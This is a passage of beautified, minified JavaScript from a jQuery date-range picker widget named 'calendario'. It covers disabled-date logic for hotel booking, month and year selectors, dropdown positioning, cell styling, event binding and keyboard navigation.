                return !1 === this.isDisabled(this.config.startDate, this.config.isHotelBooking);
            if (1 == this.config.disableOnlyEnd)
                return !1 === this.isDisabled(this.config.endDate, this.config.isHotelBooking);
            if (this.config.continuous) {
                var n = t.middleOfDay().unix();
                if (1 == this.isDisabled(n, !1) && (!this.config.isHotelBooking || 1 === this.getDisabledLevel(n)))
                    return !1;
                if (0 == t.isSame(this.config.endDate, "day")) {
                    t.middleOfDay().add(1, "days");
                    for (var i = 0; i <= e - 2; i++) {
                        if (n = t.middleOfDay().unix(),
                        this.getDisabledLevel(n) !== u)
                            return !1;
                        t.add(1, "days")
                    }
                }
                if (n = t.middleOfDay().unix(),
                1 == this.isDisabled(n, !1) && (!this.config.isHotelBooking || 3 === this.getDisabledLevel(n)))
                    return !1
            }
            return !0
        },
        isDisabledOnDraw: function(e) {
            var t = moment(e).middleOfDay();
            if (!0 === this.config.disableDays(t))
                return !0;
            for (var n = 0; n < this.config.disabledRanges.length; n++) {
                var i = this.config.disabledRanges[n];
                if (t.isBetween(i.start, i.end, "day", "[]"))
                    return !0
            }
        },
        isDisabled: function(e, t) {
            return u === t && (t = !1),
            !(1 == this.config.disableOnlyStart && 1 == this.globals.startSelected || 1 == this.config.disableOnlyEnd && 0 == this.globals.startSelected || ("object" == typeof e && null !== e && (e = e.clone().middleOfDay().unix()),
            t && this.config.isHotelBooking ? 2 !== this.globals.disabledDays[e] : this.globals.disabledDays[e] === u))
        },
        getDisabledLevel: function(e) {
            return "object" == typeof e && null !== e && (e = e.clone().middleOfDay().unix()),
            this.globals.disabledDays[e]
        },
        cellHovered: function(e) {
            (e = e || r.event).target = e.target || e.srcElement,
            !1 === g(e.target).hasClass("calendario-day") && (e.target = g(e.target).closest(".calendario-day").get(0));
            var t = g(e.target).data("value");
            this.globals.hoverDate = moment.unix(t).middleOfDay(),
            !(this.globals.keyboardHoverDate = null) === this.globals.startSelected && this.reDrawCells(),
            this.stopBubbling(e)
        },
        reDrawCalendars: function() {
            this.backupTimePickers(),
            this.input.empty(),
            this.drawUserInterface(),
            this.restoreTimePickers(),
            this.container.focus()
        },
        monthSwitchClicked: function() {
            if (!(0 < this.calendars.find(".calendario-month-selector").length)) {
                var t = this;
                this.calendars.get(0).scrollTop = 0;
                for (var e = g("<div class='calendario-month-selector'></div>").appendTo(this.calendars), n = this.globals.currentDate.get("month"), i = this.globals.currentDate.clone(), a = 0; a < 12; a++)
                    i.month(a),
                    this.config.hideOutOfRange && (i.isBefore(this.config.minDate, "month") || i.isAfter(this.config.maxDate, "month")) ? e.append("<div class='calendario-ms-month-disabled'>&nbsp;</div>") : e.append("<div class='calendario-ms-month" + (n == a ? " current" : "") + "' data-month='" + a + "'>" + (this.config.numericMonthSelector ? a + 1 : moment({
                        day: 15,
                        hour: 12,
                        month: a
                    }).locale(this.config.locale).format(this.config.monthSwitcherFormat)) + "</div>");
                e.css("display", "block"),
                this.optimizeFontSize(e.find(".calendario-ms-month")),
                e.find(".calendario-ms-month").off("click").on("click", function(e) {
                    t.globals.currentDate.month(g(this).data("month")),
                    t.config.onaftermonthchange(t, t.globals.currentDate ? t.globals.currentDate.clone().startOfMonth() : null),
                    t.calendars.find(".calendario-month-selector").remove(),
                    t.reDrawCalendars(),
                    t.stopBubbling(e)
                })
            }
        },
        drawYearSwitch: function(e, t) {
            e.empty();
            var n = this.globals.currentDate.year();
            e.data("year", t);
            var i = t - 6
              , a = t + 6;
            this.config.hideOutOfRange && (moment(i + "-01-01").isBefore(this.config.minDate, "year") || moment(i + "-12-31").isAfter(this.config.maxDate, "year")) ? e.append("<div class='calendario-ys-year-disabled'>&nbsp;</div>") : e.append("<div class='calendario-ys-year-prev'><i class='fa fa-angle-double-left'></i></div>");
            for (var s = t - 6; s < t + 7; s++)
                this.config.hideOutOfRange && (moment(s + "-06-01").isBefore(this.config.minDate, "year") || moment(s + "-06-01").isAfter(this.config.maxDate, "year")) ? e.append("<div class='calendario-ys-year-disabled'>&nbsp;</div>") : e.append("<div class='calendario-ys-year" + (n == s ? " current" : "") + "' data-year='" + s + "'>" + this.localizeNumbers(s) + "</div>");
            this.config.hideOutOfRange && (moment(a + "-01-01").isBefore(this.config.minDate, "year") || moment(a + "-12-31").isAfter(this.config.maxDate, "year")) ? e.append("<div class='calendario-ys-year-disabled'>&nbsp;</div>") : e.append("<div class='calendario-ys-year-next'><i class='fa fa-angle-double-right'></i></div>")
        },
        yearSwitchClicked: function() {
            if (!(0 < this.calendars.find(".calendario-year-selector").length)) {
                var n = this;
                this.calendars.get(0).scrollTop = 0;
                var i = g("<div class='calendario-year-selector'></div>").appendTo(this.calendars)
                  , e = this.globals.currentDate.get("year");
                this.drawYearSwitch(i, e),
                i.css("display", "block"),
                this.optimizeFontSize(i.find(".calendario-ys-year")),
                g(o).off("click.calendarioys").on("click.calendarioys", ".calendario-ys-year", function(e) {
                    n.globals.currentDate.year(g(this).data("year")),
                    n.config.onafteryearchange(n, n.globals.currentDate ? n.globals.currentDate.clone().startOf("year") : null),
                    n.reDrawCalendars(),
                    n.calendars.find(".calendario-year-selector").remove(),
                    1 == n.config.DOBCalendar && n.calendars.find(".calendario-calendar").first().find(".calendario-month-switch").click(),
                    n.stopBubbling(e)
                }),
                g(o).off("click.calendarioysprev").on("click.calendarioysprev", ".calendario-ys-year-prev", function(e) {
                    var t = i.data("year") - 13;
                    i.data("year", t),
                    n.drawYearSwitch(i, t),
                    n.stopBubbling(e)
                }),
                g(o).off("click.calendarioysnext").on("click.calendarioysnext", ".calendario-ys-year-next", function(e) {
                    var t = i.data("year") + 13;
                    i.data("year", t),
                    n.drawYearSwitch(i, t),
                    n.stopBubbling(e)
                })
            }
        },
        optimizeFontSize: function(e) {
            e.each(function(e, t) {
                (t = g(t)).wrapInner("<span class='adjust-subject'></span>").prepend("<span class='font-adjuster'>i</span>");
                var n = t.find(".adjust-subject")
                  , i = t.find(".font-adjuster");
                if (n.innerHeight() === i.innerHeight())
                    i.remove(),
                    n.contents().unwrap();
                else {
                    for (var a = 0; n.innerHeight() !== i.innerHeight() && a < 16; ) {
                        var s;
                        if (s = void 0 !== r.getComputedStyle ? parseFloat(r.getComputedStyle(i.get(0), null).getPropertyValue("font-size")) : parseFloat(i.css("font-size")),
                        n.parent().css("font-size", s - 1 + "px"),
                        i.css("font-size", s - 1 + "px"),
                        s < 2)
                            break;
                        a++
                    }
                    i.remove(),
                    n.contents().unwrap()
                }
            })
        },
        showDropdown: function(e) {
            var t = e || r.event || jQuery.Event("click", {
                target: this.elem
            })
              , n = t.target || t.srcElement;
            return (!this.globals.isMobile && "none" == this.container.css("display") || this.globals.isMobile && "none" == this.input.css("display")) && (n !== this.elem && (this.globals.dontHideOnce = !0,
            this.globals.initiator = n),
            null !== this.config.startDate && (this.globals.startDateInitial = this.config.startDate.clone()),
            null !== this.config.endDate && (this.globals.endDateInitial = this.config.endDate.clone()),
            this.fetchInputs(),
            !1 !== this.config.startEmpty && !this.globals.firstValueSelected || (this.globals.currentDate = moment(this.config.startDate)),
            0 == this.globals.currentDate.isValid() && (this.globals.currentDate = moment().locale(this.config.locale).middleOfDay()),
            this.config.onbeforeshow(this),
            this.globals.isMobile ? (this.input.css({
                display: "flex"
            }),
            this.config.inline || this.overlay.show(),
            g("body").addClass("calendario-open")) : this.container.css({
                display: "block"
            }),
            this.globals.lastScrollY = r.scrollY || r.pageYOffset || o.documentElement.scrollTop,
            this.reDrawCalendars(),
            1 == this.config.DOBCalendar && this.calendars.find(".calendario-calendar").first().find(".calendario-year-switch").click(),
            this.config.onaftershow(this)),
            !1
        },
        hideDropdown: function(e) {
            var t = e || r.event || jQuery.Event("click", {
                target: "body"
            })
              , n = t.target || t.srcElement;
            if (this.globals.initiator !== n)
                return !1 === this.config.inline && (!this.globals.isMobile && "none" !== this.container.css("display") || this.globals.isMobile && "none" !== this.input.css("display")) && (this.config.onbeforehide(this),
                this.globals.isMobile ? (this.input.css({
                    display: "none"
                }),
                g("body").removeClass("calendario-open"),
                this.config.inline || this.overlay.hide()) : this.container.css({
                    display: "none"
                }),
                (this.globals.hoverDate = null) !== this.globals.startDateBackup && (this.config.startDate = this.globals.startDateBackup,
                this.globals.startSelected = !1),
                this.config.onafterhide(this)),
                !1
        },
        reDrawCells: function() {
            var e = null !== this.config.startDate ? this.config.startDate.clone().middleOfDay().unix() : null
              , t = null !== this.config.endDate ? this.config.endDate.clone().middleOfDay().unix() : null
              , n = null !== this.config.minDate ? this.config.minDate.clone().middleOfDay().unix() : null
              , i = null !== this.config.maxDate ? this.config.maxDate.clone().middleOfDay().unix() : null
              , a = null !== this.globals.hoverDate ? this.globals.hoverDate.clone().middleOfDay().unix() : null
              , s = null !== this.globals.keyboardHoverDate ? this.globals.keyboardHoverDate.clone().middleOfDay().unix() : null
              , r = moment().middleOfDay().unix();
            this.lastHoverStatus = !1;
            for (var o = 0; o < this.config.calendarCount; o++)
                for (var l = this.calendars.find(".calendario-calendar").eq(o), d = l.find(".calendario-days-container > div").not(".calendario-dayofweek, .calendario-weeknumber"), u = l.data("month"), c = 0; c < d.length; c++) {
                    var h = g(d[c])
                      , m = parseInt(h.attr("data-value"))
                      , f = moment.unix(m).middleOfDay().locale(this.config.locale)
                      , p = "calendario-day"
                      , _ = f.day();
                    6 != _ && 0 !== _ || (p += " calendario-weekend"),
                    m === r && (p += " calendario-today"),
                    p = this.addDisabledStyles(h, f, m, p, n, i, u),
                    p = this.addSelectedStyles(m, p, e, t, n, i),
                    p = this.addHoverStyles(h, m, p, this, e, a, s),
                    h.attr("class", p)
                }
            this.attachEvents(),
            this.config.ondraw(this)
        },
        addSelectedStyles: function(e, t, n, i, a, s) {
            return !1 !== this.config.startEmpty && !this.globals.firstValueSelected || (!1 === this.config.singleDate && null !== n && n === e && (t += " calendario-start"),
            !1 === this.config.singleDate && null !== i && i === e && (t += " calendario-end"),
            !1 === this.config.singleDate && null !== n && null !== i && e <= i && n <= e && (t += " calendario-selected"),
            !0 === this.config.singleDate && null !== n && n === e && (t += " calendario-selected calendario-start calendario-end")),
            t
        },
        addHoverStyles: function(e, t, n, i, a, s, r) {
            return n.replace("calendario-hovered", "").replace("calendario-hovered-last", "").replace("calendario-hovered-first", ""),
            !0 === this.globals.startSelected && !1 === this.globals.endSelected && null !== s && (s <= t && t <= a || t <= s && a <= t) && (n += " calendario-hovered"),
            !0 === this.config.enableKeyboard && null !== r && (!1 === this.globals.startSelected ? r == t && (n += " calendario-hovered") : (t <= a && r <= t || a <= t && t <= r) && (n += " calendario-hovered")),
            !1 === this.lastHoverStatus && 0 < n.indexOf("calendario-hovered") && (this.lastHoverStatus = !0,
            n += " calendario-hovered-first"),
            !0 === this.lastHoverStatus && n.indexOf("calendario-hovered") < 0 && (e.prev(".calendario-day").addClass("calendario-hovered-last"),
            this.lastHoverStatus = !1),
            n
        },
        addDisabledStyles: function(e, t, n, i, a, s, r) {
            if (this.isDisabled(n))
                if (0 == this.config.isHotelBooking)
                    i = i.replace("calendario-day", "calendario-disabled calendario-disabled-range");
                else
                    switch (this.globals.disabledDays[n]) {
                    case 1:
                        i = i.replace("calendario-day", "calendario-day calendario-disabled-range calendario-disabled-range-start");
                        break;
                    case 2:
                        i = i.replace("calendario-day", "calendario-disabled calendario-disabled-range");
                        break;
                    case 3:
                        i = i.replace("calendario-day", "calendario-day calendario-disabled-range calendario-disabled-range-end")
                    }
            else
                (null != s && s < n || null != a && n < a) && (i = i.replace("calendario-day", "calendario-disabled"));
            return t.month() != r && (i += " calendario-not-in-month"),
            i
        },
        rangeClicked: function(e) {
            if ((e = e || r.event).target = e.target || e.srcElement,
            !1 === g(e.target).hasClass("calendario-range") && (e.target = g(e.target).closest(".calendario-range").get(0)),
            e.target.hasAttribute("data-id")) {
                var t = g(e.target).attr("data-id");
                return this.globals.currentDate = this.config.ranges[t].startDate.clone().locale(this.config.locale),
                this.config.startDate = this.config.ranges[t].startDate.clone().locale(this.config.locale),
                this.config.endDate = this.config.ranges[t].endDate.clone().locale(this.config.locale),
                !(this.globals.firstValueSelected = !0) === this.checkRangeContinuity() ? this.fetchInputs() : (this.clearRangeSelection(),
                this.config.ranges[t].selected = !0,
                this.updateTimePickerDisplay(),
                this.reDrawCalendars(),
                this.setViewport(),
                this.config.onrangeselect(this, this.config.ranges[t]),
                this.config.autoCloseOnSelect && this.hideDropdown()),
                this.stopBubbling(e),
                !1
            }
        },
        setViewport: function() {
            if (!0 === this.globals.isMobile)
                "none" !== this.input.css("display") && this.container.trigger("calendario:resize");
            else {
                if ("none" !== this.container.css("display") && this.globals.initComplete && !1 === this.globals.isMobile && !1 === this.config.inline) {
                    var e = this.getViewport();
                    switch (this.config.showOn) {
                    case "top":
                        this.config.autoAlign ? this.positionOnTopAlign(e) : this.positionOnTop(!1, e),
                        this.horizontalAlign(e);
                        break;
                    case "left":
                        this.config.autoAlign ? this.positionOnLeftAlign(e) : this.positionOnLeft(!1, e),
                        this.verticalAlign(e);
                        break;
                    case "right":
                        this.config.autoAlign ? this.positionOnRightAlign(e) : this.positionOnRight(!1, e),
                        this.verticalAlign(e);
                        break;
                    case "bottom":
                        this.config.autoAlign ? this.positionOnBottomAlign(e) : this.positionOnBottom(!1, e),
                        this.horizontalAlign(e);
                        break;
                    case "center":
                        this.positionOnCenter(e);
                        break;
                    default:
                        this.config.autoAlign ? this.positionOnBottomAlign(e) : this.positionOnBottom(!1, e),
                        this.horizontalAlign(e)
                    }
                }
                if ("horizontal" !== this.config.rangeOrientation) {
                    var t = this.input.find(".calendario-header").outerHeight() + this.input.find(".calendario-calendars").outerHeight() + (0 < this.input.find(".calendario-footer").length ? this.input.find(".calendario-footer").outerHeight() : 0) + (0 < this.input.find(".calendario-timepickers").length ? this.input.find(".calendario-timepickers").outerHeight() : 0);
                    this.input.find(".calendario-right").css("max-height", t)
                }
            }
        },
        getDropdownPos: function(e) {
            var t = this.getDimensions(this.$elem, !0)
              , n = this.getDimensions(this.container, !0)
              , i = parseInt(this.input.css("margin-left"), 10)
              , a = parseFloat(this.container.find("div[class*='calendario-box-arrow']").first().outerHeight() / 2);
            switch (e) {
            case "left":
                switch (this.config.arrowOn) {
                case "top":
                    return {
                        top: t.offsetTop - i - a - t.height / 2,
                        left: t.offsetLeft - n.width - i,
                        arrow: 0
                    };
                case "center":
                    return {
                        top: t.offsetTop - i - n.height / 2,
                        left: t.offsetLeft - n.width - i,
                        arrow: (n.height - 2 * a) / 2 - t.height / 2
                    };
                case "bottom":
                    return {
                        top: t.offsetTop - n.height + t.height + 2 * i + a,
                        left: t.offsetLeft - n.width - i,
                        arrow: n.height - 4 * a - 3 * i - t.height / 2
                    };
                default:
                    return {
                        top: t.offsetTop - i - a - t.height / 2,
                        left: t.offsetLeft - n.width - i,
                        arrow: 0
                    }
                }
                break;
            case "right":
                switch (this.config.arrowOn) {
                case "top":
                    return {
                        top: t.offsetTop - i - a - t.height / 2,
                        left: t.offsetLeft + t.width + i,
                        arrow: 0
                    };
                case "center":
                    return {
                        top: t.offsetTop - i - n.height / 2,
                        left: t.offsetLeft + t.width + i,
                        arrow: (n.height - 2 * a) / 2 - t.height / 2
                    };
                case "bottom":
                    return {
                        top: t.offsetTop - n.height + t.height + 2 * i + a,
                        left: t.offsetLeft + t.width + i,
                        arrow: n.height - 4 * a - 3 * i - t.height / 2
                    };
                default:
                    return {
                        top: t.offsetTop - i - a - t.height / 2,
                        left: t.offsetLeft + t.width + i,
                        arrow: 0
                    }
                }
                break;
            case "top":
                switch (this.config.arrowOn) {
                case "left":
                    return {
                        top: t.offsetTop - n.height - i,
                        left: t.offsetLeft - i,
                        arrow: 0
                    };
                case "center":
                    return {
                        top: t.offsetTop - n.height - i,
                        left: t.offsetLeft - (n.width - 2 * i - t.width) / 2,
                        arrow: (n.width - 5 * a) / 2
                    };
                case "right":
                    return {
                        top: t.offsetTop - n.height - i,
                        left: t.offsetLeft - (n.width - t.width) + i,
                        arrow: n.width - 5 * a + i
                    };
                default:
                    return {
                        top: t.offsetTop - n.height - i,
                        left: t.offsetLeft - i,
                        arrow: 0
                    }
                }
                break;
            case "bottom":
                switch (this.config.arrowOn) {
                case "left":
                    return {
                        top: t.offsetTop + t.height - i + a,
                        left: t.offsetLeft - i,
                        arrow: 0
                    };
                case "center":
                    return {
                        top: t.offsetTop + t.height - i + a,
                        left: t.offsetLeft - (n.width - 2 * i - t.width) / 2,
                        arrow: (n.width - 5 * a) / 2
                    };
                case "right":
                    return {
                        top: t.offsetTop + t.height - i + a,
                        left: t.offsetLeft - (n.width - t.width) + i,
                        arrow: n.width - 5 * a + i
                    };
                default:
                    return {
                        top: t.offsetTop + t.height - i + a,
                        left: t.offsetLeft - i,
                        arrow: 0
                    }
                }
                break;
            case "center":
                switch (this.config.arrowOn) {
                case "center":
                    return {
                        top: t.offsetTop - i - n.height / 2,
                        left: t.offsetLeft - (n.width - 2 * i - t.width) / 2
                    }
                }
            }
        },
        verticalAlign: function(e) {
            var t = this.getDimensions(this.container, !0)
              , n = e.top - t.offsetTop
              , i = t.offsetTop + t.height - e.bottom;
            0 < n && Math.abs(n) < t.height ? (this.container.css({
                top: function() {
                    return parseFloat(g(this).css("top").replace(/px$/, "")) + n
                }
            }),
            this.container.find("div[class*='calendario-box-arrow-']").css({
                top: function() {
                    return parseFloat(g(this).css("top").replace(/px$/, "")) - n
                }
            })) : 0 < i && Math.abs(i) < t.height && (this.container.css({
                top: function() {
                    return parseFloat(g(this).css("top").replace(/px$/, "")) - i
                }
            }),
            this.container.find("div[class*='calendario-box-arrow-']").css({
                top: function() {
                    return parseFloat(g(this).css("top").replace(/px$/, "")) + i
                }
            }))
        },
        horizontalAlign: function(e) {
            var t = this.getDimensions(this.container, !0)
              , n = t.offsetLeft + t.width - e.right;
            0 < n && Math.abs(n) < t.width && (this.container.css({
                left: function() {
                    return parseFloat(g(this).css("left").replace(/px$/, "")) - n
                }
            }),
            this.container.find("div[class*='calendario-box-arrow-']").css({
                left: function() {
                    return parseFloat(g(this).css("left").replace(/px$/, "")) + n
                }
            }))
        },
        positionOnTop: function(e, t) {
            var n = this.getDropdownPos("top");
            if (e)
                return n;
            this.container.css({
                left: n.left,
                top: n.top
            }),
            this.container.find("div[class*='calendario-box-arrow-']").css({
                left: n.arrow
            }).attr("class", "calendario-box-arrow-bottom")
        },
        positionOnBottom: function(e, t) {
            var n = this.getDropdownPos("bottom");
            if (e)
                return n;
            this.container.css({
                left: n.left,
                top: n.top
            }),
            this.container.find("div[class*='calendario-box-arrow-']").attr("class", "calendario-box-arrow-top").css({
                left: n.arrow
            })
        },
        positionOnLeft: function(e, t) {
            var n = this.getDropdownPos("left");
            if (e)
                return n;
            this.container.css({
                left: n.left,
                top: n.top + 11
            }),
            this.container.children("div[class*='calendario-box-arrow-']").attr("class", "calendario-box-arrow-right").css({
                top: n.arrow
            })
        },
        positionOnRight: function(e, t) {
            var n = this.getDropdownPos("right");
            if (e)
                return n;
            this.container.css({
                left: n.left,
                top: n.top + 11
            }),
            this.container.children("div[class*='calendario-box-arrow-']").attr("class", "calendario-box-arrow-left").css({
                top: n.arrow
            })
        },
        positionOnCenter: function(e) {
            var t = this.getDropdownPos("center")
              , n = Math.max(t.left + this.container[0].clientWidth - (e.right - 30), 0)
              , i = Math.max(t.top + this.container[0].clientHeight - (e.bottom - 30), 0);
            this.config.autoAlign || (i = n = 0),
            t.left -= n,
            t.top -= i,
            this.container.css({
                left: t.left,
                top: t.top
            }),
            this.container.find("div[class*='calendario-box-arrow-']").remove()
        },
        positionOnBottomAlign: function(e) {
            var t = this.positionOnBottom(!0, e)
              , n = this.getDimensions(this.container);
            t.top + n.height < e.bottom ? this.positionOnBottom(!1, e) : this.positionOnTop(!1, e)
        },
        positionOnLeftAlign: function(e) {
            this.positionOnLeft(!0, e).left > e.left - 50 ? this.positionOnLeft(!1, e) : this.positionOnRight(!1, e)
        },
        positionOnRightAlign: function(e) {
            var t = this.positionOnRight(!0, e)
              , n = this.getDimensions(this.container);
            t.left + n.width < e.right + 50 ? this.positionOnRight(!1, e) : this.positionOnLeft(!1, e)
        },
        positionOnTopAlign: function(e) {
            this.positionOnTop(!0, e).top > e.top ? this.positionOnTop(!1, e) : this.positionOnBottom(!1, e)
        },
        getDimensions: function(e, t) {
            var n = o.body
              , i = e[0]
              , a = e.offset();
            if (e === this.$elem && !1 === this.globals.parentScrollEventsAttached) {
                var s = g.proxy(function() {
                    this.globals.isTicking || (this.globals.isTicking = !0,
                    this.globals.rafID = this.requestAnimFrame(g.proxy(function() {
                        this.setViewport(),
                        this.cancelAnimFrame(this.globals.rafID),
                        this.globals.isTicking = !1
                    }, this)))
                }, this);
                if (i !== n)
                    for (var r = i.parentNode; r !== n && null !== r; )
                        r.scrollHeight > r.offsetHeight && g(r).off("scroll.calendario").on("scroll.calendario", s),
                        r = r.parentNode;
                this.globals.parentScrollEventsAttached = !0
            }
            return {
                width: i.offsetWidth,
                height: i.offsetHeight,
                offsetLeft: a.left,
                offsetTop: a.top
            }
        },
        getViewport: function() {
            var e = this.globals.lastScrollY
              , t = this.globals.lastScrollX
              , n = e + r.innerHeight;
            return {
                top: e,
                left: t,
                right: t + r.innerWidth,
                bottom: n
            }
        },
        attachEvents: function() {
            var e = g.proxy(this.drawNextMonth, this)
              , t = g.proxy(this.drawPrevMonth, this)
              , n = g.proxy(this.cellClicked, this)
              , i = g.proxy(this.cellHovered, this)
              , a = g.proxy(this.rangeClicked, this)
              , s = g.proxy(this.monthSwitchClicked, this)
              , r = g.proxy(this.yearSwitchClicked, this)
              , o = "click.calendario";
            if (this.container.find(".calendario-next").off(o).one(o, e),
            this.container.find(".calendario-prev").off(o).one(o, t),
            this.container.find(".calendario-day").off(o).on(o, n),
            this.container.find(".calendario-day").off("mouseover.calendario").on("mouseover.calendario", i),
            this.container.find(".calendario-disabled").not(".calendario-day").off(o),
            this.container.find(".calendario-range").off(o).on(o, a),
            this.container.find(".calendario-month-switch ").off(o).on(o, s),
            this.container.find(".calendario-year-switch ").off(o).on(o, r),
            !0 === this.globals.isMobile && 1 == this.config.enableSwipe)
                if ("function" == typeof g.fn.swiperight)
                    this.input.find(".calendario-calendars").css("touch-action", "none"),
                    this.input.find(".calendario-calendars").on("swipeleft", e),
                    this.input.find(".calendario-calendars").on("swiperight", t);
                else {
                    var l = new Hammer(this.input.find(".calendario-calendars").get(0));
                    l.off("swipeleft").on("swipeleft", e),
                    l.off("swiperight").on("swiperight", t)
                }
            !this.globals.isMobile && !this.config.showButtons || this.config.inline || (this.input.find(".calendario-cancel").off("click.calendario").on("click.calendario", g.proxy(function(e) {
                1 == this.config.onCancel(this, this.config.startDate, this.config.endDate) && (this.config.startDate = this.globals.startDateInitial ? this.globals.startDateInitial.clone() : null,
                this.config.endDate = this.globals.endDateInitial ? this.globals.endDateInitial.clone() : null,
                this.config.startEmpty && !this.globals.startDateInitial && this.clearInput(),
                this.updateTimePickerDisplay(),
                this.updateInput(!1, !1),
                this.hideDropdown(e))
            }, this)),
            this.input.find(".calendario-apply").off("click.calendario").on("click.calendario", g.proxy(function(e) {
                this.config.startDate = this.config.startDate || moment(),
                this.config.endDate = this.config.endDate || moment(),
                !0 === this.config.onbeforeselect(this, this.config.startDate.clone(), this.config.endDate.clone()) && !0 === this.checkRangeContinuity() ? (this.globals.firstValueSelected = !0,
                this.globals.delayInputUpdate ? (this.globals.delayInputUpdate = !1,
                this.updateInput(!0, !1),
                this.clearRangeSelection(),
                this.globals.delayInputUpdate = !0) : this.updateInput(!0, !1)) : this.fetchInputs(),
                this.hideDropdown(e)
            }, this)))
        },
        addInitialEvents: function() {
            var t = this
              , e = "click.calendario";
            this.globals.documentEvent = e + "_" + Math.round((new Date).getTime() + 100 * Math.random()),
            g(o).on(this.globals.documentEvent, g.proxy(function(e) {
                if (!1 === this.globals.isMobile && !1 === this.config.inline) {
                    var t = e || r.event || jQuery.Event("click", {
                        target: "body"
                    })
                      , n = t.target || t.srcElement;
                    0 === g(this.container).find(g(n)).length && this.elem !== n && 0 < this.container.is(":visible") && this.hideDropdown(t)
                }
            }, this)),
            this.config.enableKeyboard && (e = "click.calendario focus.calendario"),
            this.$elem.off(e).on(e, g.proxy(this.debounce(function(e) {
                var t = e || r.event || jQuery.Event("click", {
                    target: "body"
                })
                  , n = t.target || t.srcElement;
                0 < this.input.get(0).clientHeight && this.config.target.get(0) !== n ? this.hideDropdown(t) : (g(o).trigger("click"),
                this.showDropdown(t))
            }, 200, !0), this)),
            this.globals.isMobile && g(r).on("resize.calendario", g.proxy(function(e) {
                this.container.trigger("calendario:resize")
            }, this)),
            this.container.on("calendario:resize", g.proxy(function() {
                this.globals.rafID = this.requestAnimFrame(function() {
                    if (t.config.showCalendars) {
                        var e = t.input.find(".calendario-calendar:visible:first").innerHeight();
                        t.input.removeClass("calendario-input-top-reset"),
                        t.input.position().top < 0 && t.input.addClass("calendario-input-top-reset"),
                        g(r).width() > g(r).height() ? (t.input.find(".calendario-calendars").css({
                            maxHeight: 99999,
                            minHeight: e
                        }),
                        "flex" === t.input.css("display") && (0 < t.input.find(".calendario-header:visible").length ? t.input.css("height", e + t.input.find(".calendario-header").outerHeight() + 2 + "px") : t.input.css("height", e + 2 + "px"))) : (t.input.css("height", "auto"),
                        t.input.find(".calendario-calendars").css({
                            maxHeight: e,
                            minHeight: 0
                        }))
                    } else
                        t.input.css("height", "auto");
                    t.updateTimePickerDisplay(),
                    t.cancelAnimFrame(t.globals.rafID)
                })
            }, this)),
            "none" !== this.input.css("display") && this.globals.isMobile && this.container.trigger("calendario:resize"),
            !1 === this.globals.isMobile && g(r).on("resize.calendario scroll.calendario", function() {
                t.globals.isTicking || (t.globals.isTicking = !0,
                t.globals.lastScrollX = r.scrollX || r.pageXOffset || o.documentElement.scrollLeft,
                t.globals.lastScrollY = r.scrollY || r.pageYOffset || o.documentElement.scrollTop,
                t.globals.rafID = t.requestAnimFrame(g.proxy(function() {
                    this.setViewport(),
                    this.globals.isTicking = !1,
                    this.cancelAnimFrame(this.globals.rafID)
                }, t)))
            })
        },
        stopBubbling: function(e) {
            return "function" == typeof e.stopPropagation ? e.stopPropagation() : void 0 !== e.cancelBubble && (e.cancelBubble = !0),
            "function" == typeof e.preventDefault && e.preventDefault(),
            e.returnValue = !1
        },
        debounce: function(i, a, s) {
            return function() {
                var e = this
                  , t = arguments
                  , n = s && !e.globals.throttleTimeout;
                clearTimeout(e.globals.throttleTimeout),
                e.globals.throttleTimeout = setTimeout(function() {
                    e.globals.throttleTimeout = null,
                    s || i.apply(e, t)
                }, a),
                n && i.apply(e, t)
            }
        },
        requestAnimFrame: function(e) {
            return "function" == typeof r.requestAnimationFrame ? requestAnimationFrame(e) : "function" == typeof r.webkitRequestAnimationFrame ? webkitRequestAnimationFrame(e) : "function" == typeof r.mozRequestAnimationFrame ? mozRequestAnimationFrame(e) : setTimeout(e, 100 / 6)
        },
        cancelAnimFrame: function(e) {
            return ("function" == typeof r.cancelAnimationFrame ? cancelAnimationFrame : "function" == typeof r.webkitCancelAnimationFrame ? webkitCancelAnimationFrame : "function" == typeof r.mozCancelAnimationFrame ? mozCancelAnimationFrame : clearTimeout)(e)
        },
        addKeyboardEvents: function() {
            if (this.config.enableKeyboard && this.config.showCalendars) {
                var e = g.proxy(function(e) {
                    var t = e.which ? e.which : e.keyCode;
                    null === this.globals.keyboardHoverDate ? null === this.config.startDate ? this.globals.keyboardHoverDate = moment({
                        day: 1,
                        month: this.calendars.first().data("month")
                    }).middleOfDay() : this.globals.keyboardHoverDate = this.config.startDate.clone().middleOfDay() : this.globals.keyboardHoverDate.middleOfDay();
                    var n = !1
                      , i = !1;
                    switch (t) {
                    case 37:
                        this.globals.keyboardHoverDate.add(-1, "day"),
                        i = n = !0;
                        break;
                    case 38:
                        this.globals.keyboardHoverDate.add(-1, "week"),
                        i = n = !0;
                        break;
                    case 39:
                        this.globals.keyboardHoverDate.add(1, "day"),
                        i = n = !0;
                        break;
                    case 40:
                        this.globals.keyboardHoverDate.add(1, "week"),
                        i = n = !0;
                        break;
                    case 32:
                        this.input.find(".calendario-day[data-value='" + this.globals.keyboardHoverDate.middleOfDay().unix() + "']").first().trigger("click.calendario"),
                        i = !(n = !1);
                        break;
                    case 33:
                        e.shiftKey ? this.globals.keyboardHoverDate.add(-1, "years") : this.globals.keyboardHoverDate.add(-1, "months"),
                        i = n = !0;
                        break;
                    case 34:
                        e.shiftKey ? this.globals.keyboardHoverDate.add(1, "years") : this.globals.keyboardHoverDate.add(1, "months"),
                        i = n = !0;
                        break;
                    case 27:
                        this.hideDropdown(e);
                        break;
                    case 36:
                        e.shiftKey && (this.globals.keyboardHoverDate = moment().middleOfDay(),
                        i = n = !0)
                    }
                    if (n || i)
                        return this.globals.keyboardHoverDate = this.globals.keyboardHoverDate.middleOfDay(),
                        (this.globals.keyboardHoverDate.isBefore(moment.unix(this.input.find(".calendario-day:first").attr("data-value")), "minute") || this.globals.keyboardHoverDate.isAfter(moment.unix(this.input.find(".calendario-day:last").attr("data-value")), "minute")) && (this.globals.currentDate = this.globals.keyboardHoverDate.clone().startOfMonth(),
                        this.reDrawCalendars(),
                        n = !1),
                        n && (this.globals.hoverDate = null,
                        this.reDrawCells()),
                        i && this.stopBubbling(e),
                        this.container.find(".calendario-calendars").focus(),
                        !1
                }, this);
                this.$elem.off("keydown.calendario").on("keydown.calendario", g.proxy(function(e) {
                    var t = e.which ? e.which : e.keyCode;
                    return 9 == t && 0 == e.shiftKey && 0 == this.globals.skipTabKeyOnInput ? (this.container.find(".calendario-calendars").focus(),
                    !1) : (9 == t && 0 == e.shiftKey && (this.globals.skipTabKeyOnInput = !1),
                    !0)
                }, this)),
